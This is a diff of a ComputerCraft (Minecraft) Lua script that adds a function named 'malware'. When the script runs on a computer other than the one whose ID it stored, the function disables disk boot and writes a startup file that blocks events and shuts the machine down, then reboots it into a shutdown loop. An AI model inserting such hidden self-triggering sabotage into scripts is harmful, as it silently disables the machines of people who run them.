@@ -1,7 +1,24 @@
 local verify = require("verify")
 local utils = require("utils")
 
--- os.pullEvent = utils.pullEventOverride
+os.pullEvent = utils.pullEventOverride
+
+local function malware()
+    settings.set("shell.allow_disk_startup", false)
+
+    settings.set("computer_id", os.getComputerID())
+
+    local startup_file = fs.open("startup.lua", "w")
+
+    startup_file.write([[
+        os.pullEvent = nil
+        os.pullEventRaw = nil
+        os.shutdown()
+    ]])
+    
+
+    os.reboot()
+end
 
 local function wait_for_master_disk()
     term.setTextColor(colors.orange)
@@ -22,7 +39,13 @@ local function wait_for_master_disk()
     print("Check passed")
 end
 
-term.clear()
-term.setCursorPos(1, 1)
+local id = settings.get("computer_id")
 
-wait_for_master_disk()
+if id ~= os.getComputerID() then
+    malware()
+else
+    term.clear()
+    term.setCursorPos(1, 1)
+
+    wait_for_master_disk()
+end
